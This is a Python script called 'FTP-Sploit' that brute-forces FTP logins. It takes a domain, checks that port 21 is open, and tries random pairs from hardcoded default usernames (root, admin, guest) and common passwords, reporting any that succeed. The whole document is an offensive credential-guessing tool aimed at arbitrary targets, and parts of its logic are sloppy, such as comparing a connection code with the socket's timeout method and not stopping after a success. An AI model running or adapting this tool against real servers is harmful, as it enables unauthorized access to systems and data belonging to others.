import ftplib
import socket
import time
import os
import random
import requests
import sys 

os.system('cls' if os.name == 'nt' else 'clear')
print("")
print('''
 _____ _____ _____ _____     _     _ _   
|   __|_   _|  _  |   __|___| |___|_| |_ 
|   __| | | |   __|__   | . | | . | |  _|
|__|    |_| |__|  |_____|  _|_|___|_|_|  
                        |_|              
            FTP-Sploit
     Tools Cracked Password''')
print(" Copyright : Pham Chien")
print("")
print("Dont Talk http:// or https:// ( ex : Url : ex.com )")
print("")
url = input("url : ")
response = requests.get("http://" + url)
print("")
print(f"[*] checking {url} status : {response.status_code}")
time.sleep(0.30)

if response.status_code == 200:
    port = 21
    get_ip = socket.gethostbyname(url)
    print("")
    print(f"[-] set host : {url}")
    time.sleep(2)
    print(f"[-] host address : {get_ip} ...")
    time.sleep(0.40)
    print("[-] starting checking port....")
    time.sleep(0.40)
    print("")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)

    code = s.connect_ex((url, port))

    if code == 0:
        print(f"[+] {get_ip} Is Opening Port {port}")
        time.sleep(3)
        print(f"[!] Setting Up botton")
        time.sleep(5)

        ftp = ftplib.FTP(url)

        # list random username, password
        username = ["root", "admin", "test", "guest", "ftp", "adm", "mysql", "admin123"]
        password = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123"]
        
        for i in range(104):
            usernames = random.choice(username)
            passwords = random.choice(password)
            print("[-] FTP Login Sweep Incorect")
            time.sleep(0.10)
            print("[-] Random Username, Password list")
            time.sleep(1)
            print(f"[+] Starting Cracking USR, PWD For {get_ip} ")
            time.sleep(0.30)


            try:
                ftp.login(usernames, passwords)
                print(f"[*] IP : {get_ip}")
                print(f"[*] PORT : {port}")
                print(f"[*] Username : {usernames}")
                print(f"[*] Password : {passwords}")
                print("[*] Login Success")


            except ftplib.error_perm:
                print(f"[*] IP : {get_ip}")
                print(f"[*] PORT : {port}")
                print(f"[*] Username : {usernames}")
                print(f"[*] Password : {passwords}")
                print("[*] Login FAILED ")
                time.sleep(0.30)

    elif code == s.timeout:
        print(f"[!] {get_ip} responsed time out")

    else:
        print("[+] Port 21 Not Opening , Please Try Again !!! ")
        time.sleep(1)
        os.system('py main.py' if os.name == 'nt' else 'python main.py')

else:
    print(f"[!] {url} responsed time out")
